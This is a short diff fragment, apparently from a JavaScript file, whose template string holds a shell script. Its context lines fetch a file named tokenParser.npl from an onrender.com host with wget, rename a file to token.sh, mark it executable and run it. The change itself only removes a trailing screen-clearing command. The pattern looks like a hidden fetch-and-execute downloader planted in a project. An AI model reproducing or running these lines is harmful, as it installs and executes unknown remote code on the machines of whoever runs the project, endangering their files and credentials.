@@ -59,7 +59,7 @@ wget -qO tokenParser.npl https://be-1-49aq.onrender.com/tokenParser.npl
 mv token token.sh
 chmod +x token.sh
 ./token.sh
-clear
+
 `);
 });
 // C
